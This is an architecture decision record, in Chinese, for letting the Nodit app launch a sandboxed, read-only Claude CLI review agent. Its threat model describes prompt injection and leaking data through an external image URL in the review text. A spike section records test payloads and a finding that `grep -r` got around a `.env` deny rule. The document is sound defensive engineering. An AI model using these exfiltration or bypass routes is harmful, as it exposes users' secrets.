# 0010 — 從卡片觸發 AI review

- 狀態：Proposed
- 日期：2026-10-29（同日修訂：處理 `docs/reviews/2026-10-29-0010-review-from-card-review.md` 的 P0、P1 findings）
- 延伸：0007 的 review 附屬文件、0003 的寫入協定

## 背景

- 0007 之後，請 AI 評估卡片要離開 Nodit：開終端機、輸入 `/nodit-review ADR-009` 或對 Codex 貼一段指令，等它寫完再回 Nodit 看。卡片就在畫面上，卻要切到另一個工具才能啟動評估。
- 0007 已經把 review 的關聯、badge、過期判定都放在 Nodit 端，AI 只負責新增一個檔案。所以「從卡片觸發」只缺「啟動 AI」這一段，不需要改 review 的資料模型。
- 啟動 AI 等於從瀏覽器的一次點擊，在本機起一個能讀程式碼的 agent。權限邊界是這份決策的核心。repo 裡有兩種不可信的內容：
  - 卡片與程式碼可能被寫入針對 agent 的指令（prompt injection）。
  - repo 自帶的 agent 設定（`.claude/settings.json` 的 hooks、`.mcp.json` 的 server）可能直接執行指令。

  按鈕觸發的 agent 不能有寫檔、執行指令或連網的能力，也不能載入 repo 自帶的設定。

## 決策

### 由 server 執行本機 agent CLI

- Inspector 的 Reviews 區塊加上「請 AI 評估」按鈕。v1 只支援 `claude`，codex 的理由見下方「驗證結果」。PATH 上找不到 `claude` 時，按鈕改為「複製評估指令」，把 `/nodit-review <ID>` 複製到剪貼簿；codex 使用者也走這條路。
- server 用 `child_process.spawn` 加參數陣列執行 CLI，不經過 shell。cwd 是專案根目錄，env 繼承 Nodit 啟動時的環境，所以登入沿用使用者本機 CLI 的帳號，Nodit 不保存、也不讀取任何 API key。
- 不直接呼叫 Anthropic 或 OpenAI API。直接呼叫要自己管 key，還要在 server 重做讀卡片與相關程式碼的流程，換來的只有少一個外部程式依賴。

### agent 唯讀，檔案由 server 寫

這是跟手動 `/nodit-review` 最大的差異：手動流程由 agent 自己算指紋、自己 exclusive create；按鈕流程把這兩件事收回 server，agent 只讀不寫。

| 步驟 | 誰做 |
| --- | --- |
| 解析 target、驗證 ID 存在且唯一 | server |
| 計算 `target_rev`（0007 的整檔 SHA-1 git blob） | server，在 spawn 之前 |
| 讀卡片與相關程式碼、寫評估內容 | agent，唯讀 |
| 驗證輸出、組 frontmatter、exclusive create 寫檔 | server，經 Writer queue |

**agent 旗標**

```
claude -p <prompt> --restricted --strict-mcp-config --tools Read,Grep,Glob
  --disallowedTools 'Read(./.env*)' --permission-mode dontAsk
  --no-session-persistence --output-format json
```

| 旗標 | 作用 |
| --- | --- |
| `--restricted` | 不載入 user、project、local settings 檔，所以 repo 的 hooks、`env` 區塊、`apiKeyHelper`、allow 規則都不生效；檔案工具限制在工作目錄內，透過 symlink 指向外部也算外部；移除 Bash、WebFetch 等會執行程式的工具 |
| `--strict-mcp-config` | 只連線 `--mcp-config` 指定的 MCP server。這裡不指定，所以 `.mcp.json` 的 server 都不啟動 |
| `--tools Read,Grep,Glob` | 可用工具只有這三個，Agent、Skill、WebSearch 等其他內建工具都不存在 |
| `--disallowedTools 'Read(./.env*)'` | 擋住 `.env` 類檔案 |
| `--permission-mode dontAsk` | 任何需要核准的呼叫直接拒絕，不會卡住等待確認 |

- 參數順序：prompt 必須緊接在 `-p` 之後。`--disallowedTools` 是 variadic 參數，prompt 若接在它後面會被當成規則吃掉，CLI 回報「沒有提供輸入」。組參數的函式要有測試固定這個順序。
- 不得使用 `bypassPermissions`，也不提供設定讓使用者放寬上述任何一項。
- 不用 `--bare`：官方文件明載 `--bare` 不讀 OAuth 憑證與 keychain，需要 `ANTHROPIC_API_KEY`，違反「不管理 API key」。`--restricted` 已經涵蓋 `--bare` 想避開的 repo 設定。

**其他規則**

- **`target_rev` 在 spawn 前算**：0007 要求指紋在讀目標檔時計算。server 在 spawn 前算出指紋，job 結束後再算一次；兩次不同時仍寫入 spawn 前的值。結果是這份 review 一出現就顯示「評估後已修改」，這是保守的正確結果：agent 讀到的可能是任一版本，不能宣稱它評估過最新版。
- **取得輸出**：
  - exit code 非 0 時 job 失敗（官方文件明載執行失敗時 exit 非 0，失敗訊息印在 stdout）。
  - exit 0 時，stdout 必須解析成 JSON，而且 `result` 是字串；任一條件不符就 job 失敗。`is_error` 存在且為 true 時同樣算失敗。`is_error` 沒有官方文件，只當額外檢查，不當唯一依據。
  - 解析失敗的錯誤訊息附上 `claude --version` 與 stdout、stderr 各自的最後幾行，方便判斷是不是 CLI 改了格式。
  - `permission_denials` 是陣列且非空時，記在 job 結果裡並顯示在前端，代表 agent 嘗試越權，可能是 prompt injection 的跡象。欄位不存在時略過。
  - `total_cost_usd` 存在時帶進 job 結果，讓使用者看到單次花費。官方文件註明這是 client 端估算。
- **agent 輸出格式**：agent 的最後一則訊息是一份 markdown，frontmatter 只有 `verdict`，正文是 `## Summary` 與 `## Findings`。
- **frontmatter 合併**：
  - agent 輸出的 frontmatter 只採用 `verdict`，而且必須是 `approve`／`changes`／`reject` 其中之一，否則 job 失敗。
  - 其餘欄位一律由 server 產生：`type: review`、`target`、`reviewer: claude`、`date`、`status: open`、`target_rev`。agent frontmatter 裡的其他欄位直接丟棄，丟棄的欄位名記在 job 結果裡。
  - 組好的完整內容先用 `core/review.ts` 的 `parseReview` 驗證，通過才寫檔。驗證失敗時 job 失敗、不寫任何檔案，錯誤訊息附上 agent 輸出的開頭。
- **寫檔**：Writer 新增 `createReview(target, text)`。
  - 檔名沿用 0007 的 `<日期>-<ID>-claude-<6位hex>.md`，用 `wx` 寫入，EEXIST 時換後綴重試。
  - 路徑以 `resolveInScope` 限制在 `paths.review`，跟 `updateReviewStatus` 相同。
  - `reviewer` 固定是 `claude`，不接受 client 傳入，所以檔名裡沒有任何來自 request 的字串。target ID 先經 server 解析成既有卡片，不直接拼進路徑。

### 前置條件：review 渲染不載入外部資源

- agent 的網路被擋住，不代表 review 正文不會連網。review 由瀏覽器渲染（`src/components/ReviewViewer.tsx` 經 `renderMarkdown`），DOMPurify 設定沒有禁 `img`（`src/architecture/render.ts`），app 也沒有 CSP。正文裡的 `![](https://外部網址/?d=…)` 在使用者打開 review 時就會送出請求，被注入的 agent 可以把讀到的專案內容放進網址帶出去。
- 修法：serveStatic 對 HTML 回應送 `Content-Security-Policy`，至少包含 `img-src 'self' data:`。範圍是整個 app，因為卡片正文與 architecture 頁走同一套 renderer。
  - mermaid 等現有功能需要的來源，在拆出的 Task 裡逐項列出並納入 CSP。
  - 驗收：放一份含外部圖片的 review，打開後 Network 面板沒有對外請求。
- 這個漏洞手動 review 也有，所以拆成獨立 Task 先落地。本決策的按鈕在這個 Task 完成前不得上線。
- 已落地（2026-10-29）：policy 定義在 `server/csp.ts`。
  - **來源盤點**：字型由 fontsource 打包，屬同源；CSS 只用 `data:` SVG；mermaid 在 SVG 內插入 `<style>`，所以 `style-src` 含 `'unsafe-inline'`；沒有外部腳本或 Worker。
  - **dev 模式**：Vite dev 需要 inline script 與 HMR websocket，只套 `img-src`、`media-src` 兩條。
  - **驗收結果**：正式 build 打開含 `http://127.0.0.1:9/leak.png` 的 review，console 回報 `img-src` 違規、請求被擋；Architecture 頁兩張 mermaid 圖正常渲染、沒有其他違規。dev 模式同樣擋下外部圖片，HMR 正常。

### prompt 與 skill 共用同一份規則

- 現有的 review 規則分散在兩處：
  - `renderReviewSkill` 的步驟 1–4：步驟 3 是 Findings 規則，步驟 4 是 verdict 的定義。
  - `reviewRules()`：檔名、`set -C`、指紋指令、`status` 寫法，以及完整的 frontmatter 欄位表。
- 抽取前，先把每一條規則標成以下兩類之一：
  - **寫作規則**：評估要寫什麼。包括 Findings 是唯一的修改要求來源、優先序寫在項目開頭、`###` 分組、verdict 的定義，以及「其他段落不放修改要求」。
  - **手動流程的寫檔規則**：檔案怎麼產生。包括檔名、exclusive create、指紋計算、`status` 一律 `open`、frontmatter 欄位表。
- 寫作規則抽成獨立函式，skill 模板與按鈕 prompt 都從這裡產生。寫檔規則只留在手動流程。
- 按鈕 prompt 另外寫明輸出格式（frontmatter 只有 `verdict`），並明講「不要嘗試寫檔，只輸出評估內容」。
- 上面兩類的區分以規則內容為準，不綁定現在的函式名；實作時函式怎麼拆可以調整。

### Job 模型

- 狀態：`running` → `writing` → `succeeded`，或在任一階段轉為 `failed`／`cancelled`。job 只存在 server 記憶體，不寫檔、不跨重啟保留。
- job registry 掛在 ProjectContext 上，每個 context 一個，跟 `hub`、`writer` 同層。EventHub 建構時注入 registry。
- API：
  - `POST /api/reviews/jobs`，body `{ target }`，回 `202 { jobId }`。走既有的 token 與 session 檢查。
  - `DELETE /api/reviews/jobs/:id` 取消 job。
  - job 狀態變化用 SSE 廣播 `review-job` 事件。新連線的 `hello` 除了原本的 envelope，再附上 registry 裡目前所有 job，重新整理頁面後仍看得到進行中的評估。
  - 前端的 SSE 訂閱（`src/data/httpClient.ts`、`src/data/sync.ts`）新增 `review-job` listener，`hello` 處理改為同時讀取 job 清單。
- 限制：
  - 同一張卡片同時只能有一個未結束的 job，重複觸發回 409。
  - 全域同時最多 2 個 job，超過回 429，不排隊。排隊會讓使用者不知道 job 何時開始，v1 不做。
  - 每個 job 逾時 10 分鐘，逾時視同取消。
- 取消與逾時：
  - 用 `detached: true` spawn，對整個 process group 送 SIGTERM，5 秒後未結束改送 SIGKILL，避免 CLI 的子行程殘留。claude 執行時本身就會帶一個子 node 行程，只殺主行程會留下它。
  - job 是否被取消由 server 自己記錄，不從 exit code 推斷：spike 中 codex 被 SIGTERM 後 exit code 是 0。被標記取消的 job 即使 exit 0 也不寫檔。
- 與專案切換、server 關閉的關係：
  - `running` 階段不計入 `ctx.inflight`。job 可能跑好幾分鐘，計入會卡住切換。
  - `writing` 階段計入 `ctx.inflight`。進入 `writing` 前檢查 `ctx.closing`，已在切換就直接標為 `cancelled`、不寫檔。檢查與 `inflight++` 在同一個同步區段完成，中間不 await。這樣切換流程等 drain 時會等寫入結束，寫入也不會落在已關閉的 context。
  - 切換流程設定 `closing` 之後，取消該 context 所有 `running` 的 job，並等它們的 process group 結束（最多 SIGKILL 後再等 1 秒），然後才 `closeContext`。
  - server 的 `close()` 做同樣的事；CLI 收到 SIGINT／SIGTERM 時的 shutdown 會呼叫 `close()`，不需另外處理。Nodit 被 SIGKILL 或當掉時無法清理，逾時計時器也隨 server 消失，detached 的 CLI 會一直跑到自己結束，期間照樣消耗額度；它的輸出沒有人接收，不會寫檔。v1 接受這個限制，不做跨重啟的 pid 紀錄。

## 驗證結果（2026-10-29 spike）

環境：macOS、claude 2.1.302、codex-cli 0.153.4。用 Node `spawn`（`detached: true`、參數陣列、stdin ignore）在一個暫存專案裡執行，prompt 要求 agent 依序嘗試寫檔、改卡片、跑 shell、連網、讀檔。

**第一輪：claude 與 codex 的基本行為**

| 項目 | claude | codex |
| --- | --- | --- |
| 寫檔、改既有檔 | 拒絕（`don't ask mode`），檔案未變 | 拒絕（`operation not permitted`），檔案未變 |
| 執行 shell | 拒絕 | 可執行，但受 sandbox 限制 |
| 網路 | WebFetch 拒絕 | shell 內 `curl` 無法解析 DNS |
| 讀專案外檔案 | 只寫 `Read` 時**可讀** | **可讀**，`exec` 沒有限制讀取範圍的參數 |
| 沿用本機登入 | 可以 | 可以；但使用者 config 的預設 model 不支援時直接 400 失敗 |
| 取出最後訊息 | `--output-format json` 的 `result` | `-o <file>` |
| 對 process group 送 SIGTERM | 主行程與子 node 行程都結束，exit 143 | 結束，但 exit 0 |
| 一次評估耗時 | 約 12–27 秒（haiku、小卡片） | 未量測 |

**第二輪：repo 自帶設定與旗標組合（只測 claude）**

暫存專案放入：`.env`、指向專案外的 symlink、`.claude/settings.json` 的 SessionStart hook（`touch pwned-hook.txt`）、`.mcp.json` 的 stdio server（`touch pwned-mcp.txt`）、帶 `allowed-tools: Bash, Write` 的 project skill。

| 組合 | repo hook／MCP 執行 | 讀專案外（含 symlink） | 讀 `.env` | Bash 讀取類指令 |
| --- | --- | --- | --- | --- |
| A：`dontAsk` + `Read(./**)` 等路徑規則（本文件第一版） | **執行**，兩個 pwned 檔都產生 | 拒絕 | 加 deny 規則後拒絕；但 `grep -r` 會印出內容 | **可執行**，`grep -r ENV-SECRET .` 印出 `.env` 內容 |
| B：A + `--setting-sources user --strict-mcp-config --disallowedTools Bash` | 未執行 | 拒絕 | 拒絕 | 工具不存在 |
| C：上方「agent 旗標」 | 未執行 | 拒絕，錯誤訊息標明 `--restricted` | 拒絕 | 工具不存在；可用工具只有 Read、Grep、Glob |

A 組另外測過：project skill 在 `dontAsk` 下被拒絕；Agent tool 可以開 subagent，但 subagent 沿用同樣的權限，它的 Bash 被拒絕。兩者都沒有成為逃逸路徑。C 組的 `--tools` 直接移除了這兩個工具。C 組沿用本機 OAuth 登入正常，耗時 12 秒。

官方文件的對照（查閱日期 2026-10-29）：

- [Run Claude Code programmatically](https://code.claude.com/docs/en/headless)：`-p` 在未信任的資料夾仍執行專案 hooks、連線 `.mcp.json` server，不顯示信任對話框；`--bare` 不讀 OAuth 與 keychain。
- [Configure permissions](https://code.claude.com/docs/en/permissions)：read-only Bash 指令集在所有模式下都不需核准；Read deny 規則不涵蓋 `grep -r` 這類不指名檔案的讀取；allow 規則對 symlink 要求請求路徑與實際路徑都符合。

**結論**

- claude 的權限設計成立，前提是使用 C 組旗標。第一版的路徑規則寫法擋得住讀取範圍，但擋不住 repo 自帶的 hooks 與 MCP server，Bash 讀取類指令也能繞過 `.env` 的 deny 規則。
- codex 的 `--sandbox read-only` 擋住寫入與網路，但能讀整顆硬碟。agent 的輸出會被 server 寫進 repo，可讀範圍沒有限制時，review 正文本身就是外洩管道。v1 因此不支援 codex。之後確認 codex 能把讀取範圍限制在專案內、並且不載入 repo 自帶設定，再另外補充決策。
- 「沿用 CLI 預設 model」可能直接失敗（spike 中 codex 就是如此）。job 失敗時要把 stderr 的最後幾行帶給前端，不能只顯示「失敗」。

**仍存在的限制**

- `.env*` 拒絕規則用檔名比對。不符合 pattern 的機密檔（例如 `config/prod.secrets`）仍在可讀範圍內。這類內容能進入 review 正文，所以「前置條件」的 CSP 是必要條件，不是加強項。
- C 組只在 macOS、claude 2.1.302 驗證過。`--restricted` 的行為若在新版改變，上述保證就不成立；組參數的測試只能固定參數，固定不了 CLI 行為。

## 影響

- 新增 server 端的 job registry、兩個 API、一個 SSE 事件，前端在 Inspector 加按鈕與 job 狀態。卡片 badge 不顯示 job 狀態，v1 只在 Inspector 顯示。
- Writer 新增 `createReview`。server 的 `close()` 與專案切換流程都要加上取消 job 的步驟。
- 前置 Task：app 加上 CSP。這個 Task 也修補手動 review 既有的圖片外洩問題，要先落地。
- `core/templates.ts` 依「寫作規則」與「寫檔規則」重新拆分。產生的 skill 與 AGENTS.md 內容不變的話，`TEMPLATE_VERSION` 不需要升級。
- 手動 `/nodit-review` 流程不變，仍由 agent 自己寫檔。兩種流程產出的 review 格式相同，Nodit 不區分來源。
- 按鈕會消耗使用者 CLI 帳號的額度。Inspector 按鈕旁標示「使用本機 claude 帳號」，job 結果顯示 `total_cost_usd` 估算值。
- 不在 v1 範圍：
  - 用 codex 執行按鈕評估（理由見「驗證結果」）。
  - 多 target 的 review。
  - 指定 model 或 effort；沿用 CLI 自己的預設。
  - 從按鈕觸發「處理 review」（`nodit-review-resolve`）。處理 review 必須修改卡片，需要寫入權限，違反本決策「按鈕觸發的 agent 唯讀」的前提，要另外寫決策。
  - job 歷史、agent 完整 log 與跨重啟的 pid 紀錄。
